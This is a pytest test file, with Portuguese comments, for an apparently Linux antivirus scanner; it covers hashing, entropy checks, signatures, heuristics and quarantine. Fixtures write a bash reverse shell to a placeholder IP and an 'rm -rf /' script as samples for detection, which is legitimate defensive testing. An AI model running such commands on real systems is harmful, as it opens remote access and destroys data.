"""
tests/test_scanner.py
======================
Testes do scanner sob demanda (Patch 7).

Cobre:
  - hasher: sha256_file, sha256_bytes, is_elf, is_script, file_entropy
  - SignatureDB: open/close, lookup, is_known_threat, add, remove,
                 import_jsonl, count, meta, seed demo
  - FileScanResult / ScanReport: criação, propriedades, add, summary
  - ScanEngine: scan_file (clean, threat, whitelisted, skipped, error),
                heurísticas base (entropy, ELF, suspeito, oculto),
                scan_paths, scan_quick, auto-quarentena mock
"""

from __future__ import annotations

import hashlib
import json
import math
import os
import stat
import secrets
from pathlib import Path
from typing  import Generator
from unittest.mock import MagicMock, patch

import pytest

from ekprotection.config.manager      import ConfigManager
from ekprotection.scanner.hasher      import (
    sha256_file, sha256_bytes, is_elf, is_script, file_entropy,
)
from ekprotection.scanner.signatures  import SignatureDB, _DEMO_SIGNATURES
from ekprotection.scanner.result      import FileScanResult, ScanReport, ScanVerdict
from ekprotection.scanner.engine      import ScanEngine


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def cfg(tmp_path: Path) -> ConfigManager:
    os.environ["EKP_DATA_DIR"] = str(tmp_path)
    m = ConfigManager(tmp_path / "config.yaml")
    m.load()
    m.set("scanner.threads",             2)
    m.set("scanner.max_file_size_mb",    10)
    m.set("heuristics.entropy_threshold", 7.2)
    m.set("quarantine.auto_quarantine_critical", False)
    yield m
    os.environ.pop("EKP_DATA_DIR", None)


@pytest.fixture
def sig_db(tmp_path: Path) -> Generator[SignatureDB, None, None]:
    db = SignatureDB(tmp_path / "sigs.db")
    db.open()
    yield db
    db.close()


@pytest.fixture
def engine(cfg: ConfigManager, sig_db: SignatureDB) -> ScanEngine:
    return ScanEngine(cfg, sig_db=sig_db)


@pytest.fixture
def clean_file(tmp_path: Path) -> Path:
    f = tmp_path / "clean.txt"
    f.write_text("Este arquivo é completamente seguro.\n" * 10)
    return f


@pytest.fixture
def elf_file(tmp_path: Path) -> Path:
    f = tmp_path / "myelf"
    f.write_bytes(b"\x7fELF" + b"\x00" * 60)
    f.chmod(0o755)
    return f


@pytest.fixture
def script_file(tmp_path: Path) -> Path:
    f = tmp_path / "script.sh"
    f.write_text("#!/bin/bash\necho hello\n")
    f.chmod(0o755)
    return f


# ---------------------------------------------------------------------------
# Testes: hasher
# ---------------------------------------------------------------------------

class TestHasher:
    def test_sha256_file_matches_stdlib(self, tmp_path: Path) -> None:
        f    = tmp_path / "test.bin"
        data = secrets.token_bytes(4096)
        f.write_bytes(data)
        expected = hashlib.sha256(data).hexdigest()
        assert sha256_file(f) == expected

    def test_sha256_file_large(self, tmp_path: Path) -> None:
        """Arquivo de 2MB — deve funcionar sem estourar memória."""
        f = tmp_path / "large.bin"
        f.write_bytes(secrets.token_bytes(2 * 1024 * 1024))
        h = sha256_file(f)
        assert len(h) == 64

    def test_sha256_file_max_bytes(self, tmp_path: Path) -> None:
        """Com max_bytes, hash de partes diferentes deve diferir."""
        f = tmp_path / "multi.bin"
        f.write_bytes(b"A" * 1000 + b"B" * 1000)
        h_full  = sha256_file(f)
        h_part  = sha256_file(f, max_bytes=500)
        assert h_full != h_part

    def test_sha256_bytes(self) -> None:
        data = b"test data"
        expected = hashlib.sha256(data).hexdigest()
        assert sha256_bytes(data) == expected

    def test_is_elf_true(self, tmp_path: Path) -> None:
        f = tmp_path / "elf"
        f.write_bytes(b"\x7fELF" + b"\x00" * 10)
        assert is_elf(f) is True

    def test_is_elf_false_for_text(self, tmp_path: Path) -> None:
        f = tmp_path / "text.sh"
        f.write_text("#!/bin/bash\n")
        assert is_elf(f) is False

    def test_is_elf_missing_file(self) -> None:
        assert is_elf("/nonexistent/file") is False

    def test_is_script_true(self, tmp_path: Path) -> None:
        f = tmp_path / "script.py"
        f.write_text("#!/usr/bin/env python3\n")
        assert is_script(f) is True

    def test_is_script_false_for_elf(self, tmp_path: Path) -> None:
        f = tmp_path / "elf"
        f.write_bytes(b"\x7fELF" + b"\x00" * 10)
        assert is_script(f) is False

    def test_is_script_missing_file(self) -> None:
        assert is_script("/nonexistent") is False

    def test_file_entropy_random_is_high(self, tmp_path: Path) -> None:
        f = tmp_path / "random.bin"
        f.write_bytes(secrets.token_bytes(8192))
        e = file_entropy(f)
        assert e > 7.0   # dados aleatórios têm entropia quase 8

    def test_file_entropy_uniform_is_zero(self, tmp_path: Path) -> None:
        f = tmp_path / "uniform.bin"
        f.write_bytes(b"\x00" * 8192)
        e = file_entropy(f)
        assert e == 0.0

    def test_file_entropy_text_is_moderate(self, tmp_path: Path) -> None:
        f = tmp_path / "text.txt"
        f.write_text("Hello world! " * 500)
        e = file_entropy(f)
        assert 3.0 < e < 6.0   # texto tem entropia moderada

    def test_file_entropy_missing(self) -> None:
        assert file_entropy("/nonexistent") == 0.0

    def test_file_entropy_payload_after_64kb_was_invisible_before_fix(
        self, tmp_path: Path
    ) -> None:
        # Reprodução exata do bug ao vivo: 64KB de padding baixa-entropia +
        # payload aleatório logo depois. Antes do fix, só os primeiros
        # 65536 bytes eram lidos -> entropia 0.0, payload nunca visto.
        # Com amostragem distribuída (início/meio/fim), a janela do meio
        # cai dentro do payload aleatório e a entropia sobe bem acima do
        # 0.0 antigo -- deixa de ser um blind spot 100% determinístico.
        f = tmp_path / "padded_payload.bin"
        f.write_bytes(b"\x00" * 65536 + secrets.token_bytes(200_000))
        e = file_entropy(f)
        assert e > 5.0

    def test_file_entropy_large_file_tail_payload_detected(self, tmp_path: Path) -> None:
        # Arquivo acima do orçamento de amostragem (64KB): payload de alta
        # entropia ocupando meio+fim do arquivo (2 das 3 janelas da
        # amostragem distribuída caem inteiramente dentro do payload) é
        # detectado. Um payload pequeno isolado numa única janela, diluído
        # por padding de baixa entropia nas outras duas, pode não ser --
        # essa é a limitação documentada acima (entropia é média sobre as
        # janelas, não detecção de sub-região arbitrária).
        f = tmp_path / "large_tail_payload.bin"
        header = b"\x00" * 100_000
        body   = secrets.token_bytes(400_000)
        f.write_bytes(header + body)
        e = file_entropy(f)
        assert e > 5.0

    def test_file_entropy_no_new_false_positive_on_moderate_entropy_binary(
        self, tmp_path: Path
    ) -> None:
        # Regressão: dados de entropia moderada (não uniforme, típico de
        # código compilado real) espalhados por um arquivo maior que o
        # orçamento de amostragem não devem disparar o limiar de 7.2 só
        # por passar a olhar meio/fim além do início -- verificado ao vivo
        # contra ~3900 binários/libs reais do sistema (zero falsos
        # positivos novos, 15 já existentes corrigidos).
        f = tmp_path / "moderate_large.bin"
        size = 300_000
        f.write_bytes(bytes((i % 97) for i in range(size)))
        e = file_entropy(f)
        assert e < 7.2


# ---------------------------------------------------------------------------
# Testes: SignatureDB
# ---------------------------------------------------------------------------

class TestSignatureDB:
    def test_open_creates_db(self, tmp_path: Path) -> None:
        db = SignatureDB(tmp_path / "test.db")
        db.open()
        assert db.count() > 0   # demo signatures
        db.close()

    def test_demo_signatures_loaded(self, sig_db: SignatureDB) -> None:
        assert sig_db.count() == len(_DEMO_SIGNATURES)

    def test_demo_seeds_only_once(self, tmp_path: Path) -> None:
        db = SignatureDB(tmp_path / "once.db")
        db.open()
        first_count = db.count()
        db.close()
        db2 = SignatureDB(tmp_path / "once.db")
        db2.open()
        assert db2.count() == first_count
        db2.close()

    def test_lookup_known_hash(self, sig_db: SignatureDB) -> None:
        demo_hash = _DEMO_SIGNATURES[0]["sha256"]
        result    = sig_db.lookup(demo_hash)
        assert result is not None
        assert result["sha256"]      == demo_hash
        assert result["name"]        == _DEMO_SIGNATURES[0]["name"]
        assert result["threat_type"] == _DEMO_SIGNATURES[0]["threat_type"]

    def test_lookup_unknown_hash(self, sig_db: SignatureDB) -> None:
        assert sig_db.lookup("deadbeef" * 8) is None

    def test_is_known_threat_true(self, sig_db: SignatureDB) -> None:
        assert sig_db.is_known_threat(_DEMO_SIGNATURES[1]["sha256"]) is True

    def test_is_known_threat_false(self, sig_db: SignatureDB) -> None:
        assert sig_db.is_known_threat("nothreathash000") is False

    def test_add_new_signature(self, sig_db: SignatureDB) -> None:
        ok = sig_db.add("newhash123", "New.Threat", "Trojan", "alto")
        assert ok is True
        assert sig_db.is_known_threat("newhash123") is True

    def test_add_duplicate_returns_false(self, sig_db: SignatureDB) -> None:
        sig_db.add("dupehash", "Dupe", "Test", "baixo")
        ok = sig_db.add("dupehash", "Dupe", "Test", "baixo")
        assert ok is False

    def test_remove_existing(self, sig_db: SignatureDB) -> None:
        sig_db.add("removeme", "Remove.Test", "Test", "baixo")
        assert sig_db.remove("removeme") is True
        assert sig_db.is_known_threat("removeme") is False

    def test_remove_nonexistent(self, sig_db: SignatureDB) -> None:
        assert sig_db.remove("notexists") is False

    def test_count_increases_on_add(self, sig_db: SignatureDB) -> None:
        before = sig_db.count()
        sig_db.add("counttest", "Count.Test", "Test", "baixo")
        assert sig_db.count() == before + 1

    def test_meta_has_version(self, sig_db: SignatureDB) -> None:
        m = sig_db.meta()
        assert "version" in m

    def test_import_jsonl(self, sig_db: SignatureDB, tmp_path: Path) -> None:
        lines = [
            json.dumps({"sha256": f"import_hash_{i:03d}", "name": f"Import.{i}",
                        "threat_type": "Test", "severity": "médio", "source": "test"})
            for i in range(5)
        ]
        f = tmp_path / "import.jsonl"
        f.write_text("\n".join(lines))
        added, dupes = sig_db.import_jsonl(f)
        assert added == 5
        assert dupes == 0

    def test_import_jsonl_duplicates(self, sig_db: SignatureDB, tmp_path: Path) -> None:
        sig_db.add("dupejsonl", "Dupe.JSONL", "Test", "baixo")
        line = json.dumps({"sha256": "dupejsonl", "name": "Dupe.JSONL",
                           "threat_type": "Test", "severity": "baixo"})
        f = tmp_path / "dupe.jsonl"
        f.write_text(line)
        added, dupes = sig_db.import_jsonl(f)
        assert added == 0
        assert dupes == 1


# ---------------------------------------------------------------------------
# Testes: FileScanResult / ScanReport
# ---------------------------------------------------------------------------

class TestScanResult:
    def test_clean_result(self) -> None:
        r = FileScanResult(path="/tmp/clean.txt", verdict=ScanVerdict.CLEAN)
        assert r.is_threat   is False
        assert r.is_critical is False

    def test_threat_result(self) -> None:
        r = FileScanResult(
            path="/tmp/evil.sh", verdict=ScanVerdict.THREAT,
            risk_level="alto",
        )
        assert r.is_threat   is True
        assert r.is_critical is False

    def test_critical_result(self) -> None:
        r = FileScanResult(
            path="/tmp/critical.sh", verdict=ScanVerdict.THREAT,
            risk_level="crítico",
        )
        assert r.is_threat   is True
        assert r.is_critical is True

    def test_to_dict_has_all_keys(self) -> None:
        r = FileScanResult(path="/tmp/x", verdict=ScanVerdict.CLEAN)
        d = r.to_dict()
        for key in ("path", "verdict", "sha256", "threat_name", "risk_level",
                    "reason", "entropy", "is_elf", "is_script", "scanned_at"):
            assert key in d

    def test_scan_report_add(self) -> None:
        report = ScanReport(scan_type="test")
        report.add(FileScanResult(path="/a", verdict=ScanVerdict.CLEAN))
        report.add(FileScanResult(path="/b", verdict=ScanVerdict.THREAT, risk_level="alto"))
        report.add(FileScanResult(path="/c", verdict=ScanVerdict.SKIPPED))
        report.finish()
        assert report.total_files    == 3
        assert report.scanned_files  == 2
        assert report.skipped_files  == 1
        assert report.threats_found  == 1

    def test_scan_report_threats(self) -> None:
        report = ScanReport(scan_type="test")
        report.add(FileScanResult(path="/clean", verdict=ScanVerdict.CLEAN))
        report.add(FileScanResult(path="/evil",  verdict=ScanVerdict.THREAT))
        assert len(report.threats) == 1
        assert report.threats[0].path == "/evil"

    def test_scan_report_duration(self) -> None:
        import time
        report = ScanReport(scan_type="test")
        time.sleep(0.01)
        report.finish()
        assert report.duration_ms is not None
        assert report.duration_ms >= 0

    def test_scan_report_summary(self) -> None:
        report = ScanReport(scan_type="quick")
        report.finish()
        s = report.summary()
        assert s["scan_type"] == "quick"
        assert "duration_ms"  in s


# ---------------------------------------------------------------------------
# Testes: ScanEngine — scan_file
# ---------------------------------------------------------------------------

class TestScanEngineFile:
    def test_clean_file_returns_clean(self, engine: ScanEngine, clean_file: Path) -> None:
        r = engine.scan_file(clean_file)
        assert r.verdict == ScanVerdict.CLEAN
        assert r.sha256  is not None
        assert len(r.sha256) == 64

    def test_missing_file_returns_skipped(self, engine: ScanEngine) -> None:
        r = engine.scan_file("/nonexistent/file.txt")
        assert r.verdict == ScanVerdict.SKIPPED

    def test_known_threat_hash_detected(
        self, engine: ScanEngine, tmp_path: Path
    ) -> None:
        threat_hash = _DEMO_SIGNATURES[1]["sha256"]
        # Cria arquivo cujo hash está na DB de assinaturas
        # (usamos mock para substituir o hash calculado)
        f = tmp_path / "malware.sh"
        f.write_bytes(secrets.token_bytes(64))
        with patch("ekprotection.scanner.engine.sha256_file", return_value=threat_hash):
            r = engine.scan_file(f)
        assert r.verdict     == ScanVerdict.THREAT
        assert r.sha256      == threat_hash
        assert r.threat_name == _DEMO_SIGNATURES[1]["name"]
        assert r.risk_level  == _DEMO_SIGNATURES[1]["severity"]

    def test_skipped_extension(self, engine: ScanEngine, tmp_path: Path) -> None:
        f = tmp_path / "movie.mp4"
        f.write_bytes(b"\x00" * 100)
        r = engine.scan_file(f)
        assert r.verdict == ScanVerdict.SKIPPED

    def test_png_real_still_skipped(self, engine: ScanEngine, tmp_path: Path) -> None:
        f = tmp_path / "logo.png"
        f.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)
        assert engine.scan_file(f).verdict == ScanVerdict.SKIPPED

    def test_elf_disguised_as_png_not_skipped(self, engine: ScanEngine,
                                              tmp_path: Path) -> None:
        """2026-10-26: `update.png` que é ELF saía como SKIPPED pela extensão,
        então o H022 (disfarce) nunca rodava, nem sob demanda."""
        f = tmp_path / "update.png"
        f.write_bytes(b"\x7fELF" + b"\x00" * 100)
        r = engine.scan_file(f)
        assert r.verdict != ScanVerdict.SKIPPED
        assert r.is_elf

    def test_large_file_skipped(self, cfg: ConfigManager, sig_db: SignatureDB,
                                tmp_path: Path) -> None:
        cfg.set("scanner.max_file_size_mb", 0)   # 0MB = qualquer arquivo é grande demais
        eng = ScanEngine(cfg, sig_db=sig_db)
        f   = tmp_path / "big.bin"
        f.write_bytes(b"\x00" * 1024)
        r   = eng.scan_file(f)
        assert r.verdict == ScanVerdict.SKIPPED
        assert "grande" in (r.reason or "")

    def test_canary_skipped_without_opening(self, cfg: ConfigManager, sig_db: SignatureDB,
                                            tmp_path: Path) -> None:
        """Escanear o arquivo-isca disparava o alerta de canary (2026-11-04)."""
        key = tmp_path / "id_ed25519"
        key.write_text("-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE\n")
        link = tmp_path / "link"
        link.symlink_to(key)
        other = tmp_path / "x.sh"
        other.write_text("echo oi\n")
        cfg.set("monitor.canary_paths", [str(key)])
        eng = ScanEngine(cfg, sig_db=sig_db)
        real_open = open
        opened: list[str] = []
        def spy(p, *a, **kw):
            opened.append(os.path.realpath(str(p)))
            return real_open(p, *a, **kw)
        with patch("builtins.open", spy):
            r1 = eng.scan_file(key)
            r2 = eng.scan_file(link)
            r3 = eng.scan_file(other)
        assert r1.verdict == ScanVerdict.SKIPPED and "isca" in (r1.reason or "")
        assert r2.verdict == ScanVerdict.SKIPPED
        assert r3.verdict != ScanVerdict.SKIPPED
        assert str(key.resolve()) not in opened

    def test_whitelist_path_skipped(self, cfg: ConfigManager, sig_db: SignatureDB,
                                    tmp_path: Path) -> None:
        from ekprotection.exceptions.manager import ExceptionManager
        exc = ExceptionManager(cfg)
        exc.open()
        exc.add_whitelist_path(str(tmp_path / "*"))

        eng = ScanEngine(cfg, sig_db=sig_db, exc_manager=exc)
        f   = tmp_path / "trusted.sh"
        f.write_bytes(secrets.token_bytes(64))
        r   = eng.scan_file(f)
        assert r.verdict == ScanVerdict.SKIPPED
        assert "whitelist" in (r.reason or "").lower()
        exc.close()

    def test_whitelist_hash_skipped(self, cfg: ConfigManager, sig_db: SignatureDB,
                                    tmp_path: Path) -> None:
        from ekprotection.exceptions.manager import ExceptionManager
        f = tmp_path / "trusted.bin"
        f.write_bytes(secrets.token_bytes(64))
        real_hash = sha256_file(f)

        exc = ExceptionManager(cfg)
        exc.open()
        exc.add_whitelist_hash(real_hash, "arquivo auditado")

        eng = ScanEngine(cfg, sig_db=sig_db, exc_manager=exc)
        r   = eng.scan_file(f)
        assert r.verdict == ScanVerdict.SKIPPED
        assert "whitelist" in (r.reason or "").lower()
        exc.close()

    def test_blacklist_hash_detected(self, cfg: ConfigManager, sig_db: SignatureDB,
                                     tmp_path: Path) -> None:
        from ekprotection.exceptions.manager import ExceptionManager
        f = tmp_path / "bad.bin"
        f.write_bytes(secrets.token_bytes(64))
        real_hash = sha256_file(f)

        exc = ExceptionManager(cfg)
        exc.open()
        exc.add_blacklist_hash(real_hash, "confirmado malicioso")

        eng = ScanEngine(cfg, sig_db=sig_db, exc_manager=exc)
        r   = eng.scan_file(f)
        assert r.verdict   == ScanVerdict.THREAT
        assert r.risk_level == "crítico"
        exc.close()

    def test_sha256_present_in_result(self, engine: ScanEngine, clean_file: Path) -> None:
        r = engine.scan_file(clean_file)
        assert r.sha256 is not None
        # Verifica que o hash é correto
        expected = sha256_file(clean_file)
        assert r.sha256 == expected

    def test_scan_returns_file_size(self, engine: ScanEngine, clean_file: Path) -> None:
        r = engine.scan_file(clean_file)
        assert r.file_size == clean_file.stat().st_size

    def test_elf_detected(self, engine: ScanEngine, elf_file: Path) -> None:
        r = engine.scan_file(elf_file)
        assert r.is_elf is True

    def test_script_detected(self, engine: ScanEngine, script_file: Path) -> None:
        r = engine.scan_file(script_file)
        assert r.is_script is True


# ---------------------------------------------------------------------------
# Testes: heurísticas base
# ---------------------------------------------------------------------------

class TestScanEngineHeuristics:
    def test_executable_in_tmp_flagged(self, engine: ScanEngine, tmp_path: Path) -> None:
        """Cria arquivo executável em /tmp — deve ser SUSPICIOUS."""
        # Usa mock para simular /tmp path sem criar arquivo lá de fato
        f = tmp_path / "evil"
        f.write_bytes(b"\x7fELF" + b"\x00" * 60)
        f.chmod(0o755)

        with patch("ekprotection.scanner.engine.sha256_file", return_value="cleanclean" * 6), \
             patch.object(engine._sig_db, "lookup", return_value=None):
            # Força o path a parecer /tmp
            fake_path = "/tmp/suspicious_elf"
            with patch("os.stat") as mock_stat, \
                 patch("pathlib.Path.exists", return_value=True), \
                 patch("pathlib.Path.is_file", return_value=True):
                mock_stat.return_value = MagicMock(
                    st_size=512, st_mode=0o100755
                )
                with patch("ekprotection.scanner.engine.is_elf", return_value=True), \
                     patch("ekprotection.scanner.engine.is_script", return_value=False), \
                     patch("ekprotection.scanner.engine.file_entropy", return_value=3.0):
                    r = engine._scan_file_inner(fake_path)

        assert r.verdict in (ScanVerdict.SUSPICIOUS, ScanVerdict.CLEAN)
        if r.verdict == ScanVerdict.SUSPICIOUS:
            assert "tmp" in (r.reason or "").lower()

    @pytest.mark.parametrize("path, flagged", [
        ("/tmp/x", True),
        ("/var/tmp/a/b", True),
        ("/run/user/1000/x", True),
        ("/dev/shm/x", True),
        ("/tmpfoo/x", False),        # rodada 2026-10-31: prefixo sem fronteira
        ("/run/username/x", False),
        ("/dev/shmem/x", False),
    ])
    def test_suspicious_dir_needs_path_boundary(
        self, engine: ScanEngine, path: str, flagged: bool,
    ) -> None:
        risk, reason = engine._heuristic_check(
            path, "", 512, 0o100755, True, False, False, None,
        )
        assert (reason is not None and "executável em" in reason) is flagged

    def test_high_entropy_executable_flagged(self, engine: ScanEngine, tmp_path: Path) -> None:
        f = tmp_path / "packed"
        f.write_bytes(secrets.token_bytes(4096))
        f.chmod(0o755)

        with patch("ekprotection.scanner.engine.sha256_file", return_value="safe" * 16), \
             patch.object(engine._sig_db, "lookup", return_value=None), \
             patch("ekprotection.scanner.engine.is_elf", return_value=True), \
             patch("ekprotection.scanner.engine.is_script", return_value=False), \
             patch("ekprotection.scanner.engine.file_entropy", return_value=7.9):
            r = engine._scan_file_inner(str(f))

        assert r.verdict == ScanVerdict.SUSPICIOUS
        assert "entropia" in (r.reason or "").lower()

    def test_hidden_executable_flagged(self, engine: ScanEngine, tmp_path: Path) -> None:
        f = tmp_path / ".hidden_exec"
        f.write_bytes(b"#!/bin/sh\nrm -rf /")
        f.chmod(0o755)

        with patch("ekprotection.scanner.engine.sha256_file", return_value="safe" * 16), \
             patch.object(engine._sig_db, "lookup", return_value=None), \
             patch("ekprotection.scanner.engine.is_elf", return_value=False), \
             patch("ekprotection.scanner.engine.is_script", return_value=True), \
             patch("ekprotection.scanner.engine.file_entropy", return_value=4.0):
            r = engine._scan_file_inner(str(f))

        assert r.verdict == ScanVerdict.SUSPICIOUS
        assert "oculto" in (r.reason or "").lower()


# ---------------------------------------------------------------------------
# Testes: scan de múltiplos arquivos
# ---------------------------------------------------------------------------

class TestScanEnginePaths:
    def test_scan_paths_empty(self, engine: ScanEngine, tmp_path: Path) -> None:
        report = engine.scan_paths([str(tmp_path / "nonexistent")])
        assert report.total_files == 0

    def test_scan_paths_multiple_files(self, engine: ScanEngine, tmp_path: Path) -> None:
        d = tmp_path / "multi"; d.mkdir()
        for i in range(5):
            (d / f"file{i}.txt").write_text(f"content {i}")
        report = engine.scan_paths([str(d)], recursive=False)
        assert report.total_files == 5

    def test_scan_paths_recursive(self, engine: ScanEngine, tmp_path: Path) -> None:
        d = tmp_path / "recur"; d.mkdir()
        sub = d / "sub"; sub.mkdir()
        (d / "root.txt").write_text("root")
        (sub / "child.txt").write_text("child")
        report = engine.scan_paths([str(d)], recursive=True)
        assert report.total_files == 2

    def test_scan_paths_nonrecursive(self, engine: ScanEngine, tmp_path: Path) -> None:
        d = tmp_path / "nonrec"; d.mkdir()
        sub = d / "sub"; sub.mkdir()
        (d / "root.txt").write_text("root")
        (sub / "child.txt").write_text("child")
        report = engine.scan_paths([str(d)], recursive=False)
        assert report.total_files == 1

    def test_scan_paths_progress_callback(self, engine: ScanEngine, tmp_path: Path) -> None:
        d = tmp_path / "cb"; d.mkdir()
        (d / "a.txt").write_text("a")
        (d / "b.txt").write_text("b")
        called = []
        engine.scan_paths([str(d)], progress_cb=lambda p: called.append(p))
        assert len(called) == 2

    def test_scan_paths_reports_threats(self, engine: ScanEngine, tmp_path: Path) -> None:
        f = tmp_path / "threat.bin"
        f.write_bytes(secrets.token_bytes(64))
        threat_hash = _DEMO_SIGNATURES[0]["sha256"]

        with patch("ekprotection.scanner.engine.sha256_file", return_value=threat_hash):
            report = engine.scan_paths([str(f)])

        assert report.threats_found >= 1

    def test_scan_quick_uses_config_paths(self, cfg: ConfigManager,
                                          sig_db: SignatureDB, tmp_path: Path) -> None:
        safe_dir = tmp_path / "quick_scan"
        safe_dir.mkdir()
        (safe_dir / "file.txt").write_text("safe content")
        cfg.set("scanner.quick_scan_paths", [str(safe_dir)])
        eng = ScanEngine(cfg, sig_db=sig_db)
        report = eng.scan_quick()
        assert report.scan_type   == "quick"
        assert report.total_files >= 1

    def test_scan_report_finishes(self, engine: ScanEngine, tmp_path: Path) -> None:
        (tmp_path / "x.txt").write_text("x")
        report = engine.scan_paths([str(tmp_path)])
        assert report.finished_at is not None
        assert report.duration_ms is not None

    def test_auto_quarantine_critical(self, cfg: ConfigManager,
                                      sig_db: SignatureDB, tmp_path: Path) -> None:
        """Ameaça crítica com auto_quarantine=True chama quarantine_file."""
        cfg.set("quarantine.auto_quarantine_critical", True)

        mock_quar = MagicMock()
        mock_quar.quarantine_file.return_value = MagicMock(entry_id=1)

        eng = ScanEngine(cfg, sig_db=sig_db, quar_manager=mock_quar)

        f = tmp_path / "critical.bin"
        f.write_bytes(secrets.token_bytes(64))

        critical_hash = _DEMO_SIGNATURES[1]["sha256"]   # severity=crítico
        with patch("ekprotection.scanner.engine.sha256_file", return_value=critical_hash):
            r = eng.scan_file(f)

        assert r.is_critical is True
        mock_quar.quarantine_file.assert_called_once()

    def test_auto_quarantine_not_triggered_for_non_critical(
        self, cfg: ConfigManager, sig_db: SignatureDB, tmp_path: Path
    ) -> None:
        cfg.set("quarantine.auto_quarantine_critical", True)
        mock_quar = MagicMock()
        eng = ScanEngine(cfg, sig_db=sig_db, quar_manager=mock_quar)

        f = tmp_path / "low.txt"
        f.write_text("safe content")
        eng.scan_file(f)
        mock_quar.quarantine_file.assert_not_called()

    def test_auto_quarantine_reason_is_heuristic_for_heuristic_threat(
        self, cfg: ConfigManager, sig_db: SignatureDB, tmp_path: Path
    ) -> None:
        """Ameaça vinda de detecção heurística (não assinatura) deve
        quarentenar com QuarantineReason.HEURISTIC, não SIGNATURE_MATCH
        (achado real desta rodada — antes ficava sempre hardcoded pra
        SIGNATURE_MATCH mesmo quando a origem era o HeuristicEngine)."""
        from ekprotection.heuristics.engine import HeuristicEngine
        from ekprotection.quarantine.models import QuarantineReason

        cfg.set("quarantine.auto_quarantine_critical", True)
        mock_quar = MagicMock()
        heur = HeuristicEngine(cfg)
        eng  = ScanEngine(cfg, sig_db=sig_db, quar_manager=mock_quar,
                          heuristic_engine=heur)

        f = tmp_path / "evil.sh"
        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")

        r = eng.scan_file(f)

        assert r.is_critical is True
        assert r.threat_type == "Heuristic"
        mock_quar.quarantine_file.assert_called_once()
        _, kwargs = mock_quar.quarantine_file.call_args
        assert kwargs["reason"] == QuarantineReason.HEURISTIC


# ---------------------------------------------------------------------------
# Auto-quarentena com monitor.paths que é symlink (2026-11-12)
# ---------------------------------------------------------------------------

_MARK = b"EKP-HARMLESS-TEST-MARKER (nao executa)\n"


class TestAutoQuarantineSymlinkRoot:
    """
    O FSWatcher reescreve os eventos pro prefixo configurado (/bin no Ubuntu,
    onde /bin -> usr/bin) e desde 2026-11-11 a quarentena recusa caminho com
    symlink. Resultado: nada em /bin nem /usr/bin era auto-quarentenado.
    O scanner traduz só o prefixo configurado. Abaixo dele, symlink continua
    recusado.
    """

    @pytest.fixture
    def base(self, tmp_path: Path) -> Path:
        base = Path(os.path.realpath(tmp_path))
        (base / "usr_bin").mkdir()
        (base / "bin").symlink_to("usr_bin")
        (base / "etc").mkdir()
        (base / "etc" / "passwd").write_bytes(b"root:x:0:0:FAKE\n")
        return base

    def _engine(self, cfg: ConfigManager, sig_db: SignatureDB, paths: list[Path]):
        from ekprotection.quarantine.manager import QuarantineManager
        cfg.set("quarantine.auto_quarantine_critical", True)
        cfg.set("monitor.paths", [str(p) for p in paths])
        sig_db.add(hashlib.sha256(_MARK).hexdigest(), "Lab.Marker", "Trojan", "crítico")
        quar = QuarantineManager(cfg).open()
        return ScanEngine(cfg, sig_db=sig_db, quar_manager=quar), quar

    def test_root_symlink_is_quarantined(self, cfg, sig_db, base) -> None:
        eng, quar = self._engine(cfg, sig_db, [base / "bin"])
        (base / "usr_bin" / "miner").write_bytes(_MARK)
        r = eng.scan_file(base / "bin" / "miner")
        assert r.is_critical
        assert not (base / "usr_bin" / "miner").exists()
        [e] = quar.list_active()
        assert e.original_path == str(base / "usr_bin" / "miner")
        quar.close()

    def test_ubuntu_default_real_and_link(self, cfg, sig_db, base) -> None:
        # monitor.paths padrão tem /usr/bin e /bin: o evento sai como /bin/x
        eng, quar = self._engine(cfg, sig_db, [base / "usr_bin", base / "bin"])
        (base / "usr_bin" / "miner").write_bytes(_MARK)
        eng.scan_file(base / "bin" / "miner")
        assert not (base / "usr_bin" / "miner").exists()
        assert len(quar.list_active()) == 1
        quar.close()

    def test_real_root_unchanged(self, cfg, sig_db, base) -> None:
        eng, quar = self._engine(cfg, sig_db, [base / "usr_bin"])
        (base / "usr_bin" / "miner").write_bytes(_MARK)
        eng.scan_file(base / "usr_bin" / "miner")
        assert len(quar.list_active()) == 1
        quar.close()

    def test_dir_swapped_below_root_still_refused(self, cfg, sig_db, base) -> None:
        # ataque de 11-11 dentro de uma raiz symlink: dl trocado por link pra etc
        eng, quar = self._engine(cfg, sig_db, [base / "bin"])
        (base / "usr_bin" / "dl").symlink_to(base / "etc")
        with patch("ekprotection.scanner.engine.sha256_file",
                   return_value=hashlib.sha256(_MARK).hexdigest()):
            eng.scan_file(base / "bin" / "dl" / "passwd")
        assert (base / "etc" / "passwd").read_bytes() == b"root:x:0:0:FAKE\n"
        assert quar.list_active() == []
        quar.close()

    def test_file_symlink_below_root_still_refused(self, cfg, sig_db, base) -> None:
        eng, quar = self._engine(cfg, sig_db, [base / "bin"])
        (base / "usr_bin" / "miner").symlink_to(base / "etc" / "passwd")
        with patch("ekprotection.scanner.engine.sha256_file",
                   return_value=hashlib.sha256(_MARK).hexdigest()):
            eng.scan_file(base / "bin" / "miner")
        assert (base / "etc" / "passwd").exists()
        assert os.path.islink(base / "usr_bin" / "miner")
        assert quar.list_active() == []
        quar.close()

    def test_untrusted_link_owner_not_translated(self, cfg, sig_db, base, caplog) -> None:
        # link do próprio usuário de teste, daemon "rodando" com outro euid
        with patch("ekprotection.scanner.engine.os.geteuid", return_value=987654):
            with caplog.at_level("WARNING", logger="ekprotection.scanner.engine"):
                eng, quar = self._engine(cfg, sig_db, [base / "bin"])
        assert eng._root_map == []
        assert "não confiável" in caplog.text
        (base / "usr_bin" / "miner").write_bytes(_MARK)
        eng.scan_file(base / "bin" / "miner")
        assert (base / "usr_bin" / "miner").exists()
        assert quar.list_active() == []
        quar.close()

    def test_chained_links(self, cfg, sig_db, base) -> None:
        (base / "sbin").symlink_to("bin")        # sbin -> bin -> usr_bin
        eng, quar = self._engine(cfg, sig_db, [base / "sbin"])
        assert eng._root_map == [(str(base / "sbin"), str(base / "usr_bin"))]
        (base / "usr_bin" / "miner").write_bytes(_MARK)
        eng.scan_file(base / "sbin" / "miner")
        assert len(quar.list_active()) == 1
        quar.close()

    def test_link_in_middle_component(self, cfg, sig_db, base) -> None:
        (base / "usr_bin" / "sub").mkdir()
        eng, quar = self._engine(cfg, sig_db, [base / "bin" / "sub"])
